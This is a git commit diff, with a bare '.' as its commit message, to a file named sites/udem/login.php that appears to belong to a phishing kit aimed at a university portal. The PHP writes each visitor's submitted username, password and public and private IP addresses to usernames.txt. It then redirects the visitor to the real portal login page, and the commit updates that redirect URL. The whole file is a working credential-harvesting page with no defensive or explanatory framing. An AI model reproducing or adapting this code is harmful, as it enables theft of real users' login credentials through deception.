552031d289dd8f4a5c6417918ec0a3d9a44885fb
Alberto Cardenas <alberto@hackerops.com>
2019-06-28 17:02:14 -0500

    .

--- sites/udem/login.php
+++ sites/udem/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password']." IP Publica: " . $_POST['ipPublica']." IP Privada: " . $_POST['ipPrivada'] . "\n", FILE_APPEND);
-header('Location: https://portal.udem.edu/login');
+header('Location: https://portal.udem.edu:8447/cas/login?service=https%3A%2F%2Fportal.udem.edu%2Fc%2Fportal%2Flogin');
 ?>
